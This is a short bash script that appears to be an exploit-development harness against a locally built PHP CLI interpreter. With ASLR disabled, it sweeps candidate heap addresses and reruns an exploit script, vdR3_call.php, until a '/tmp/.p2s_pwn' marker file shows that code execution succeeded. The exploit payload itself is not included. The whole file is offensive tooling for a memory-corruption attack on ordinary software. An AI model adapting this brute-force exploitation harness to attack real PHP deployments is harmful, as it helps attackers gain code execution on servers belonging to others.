#!/bin/bash
# Find the zero4 8160-block: sweep chunk 2 (0x7ffff5200000) and chunk 3.
set -u
PHP=/tmp/php8512_build/plain2/sapi/cli/php
cd /tmp/dbg_zero4
BASEDEC=0093824990838784
for chunk in 0x7ffff5200000 0x7ffff5000000; do
for off in 0 10000 20000 30000 40000 50000 60000 70000 80000 90000 a0000 b0000 c0000 d0000 e0000 f0000 100000 110000 120000 130000 140000 150000 160000 170000 180000 190000 1a0000 1b0000 1c0000 1d0000 1e0000 1f0000; do
  base=$(( $chunk + 0x$off ))
  dec=$(printf "%016d" $base)
  rm -f /tmp/.p2s_pwn /tmp/.p2s_cmd
  timeout 30 setarch x86_64 -R $PHP -n vdR3_call.php "$dec" "$BASEDEC" >/dev/null 2>&1
  if [ -f /tmp/.p2s_pwn ]; then echo "HIT chunk=$(printf 0x%x $chunk)+0x$off :: $(cat /tmp/.p2s_pwn | head -2)"; exit 0; fi
done
done
echo no-hit
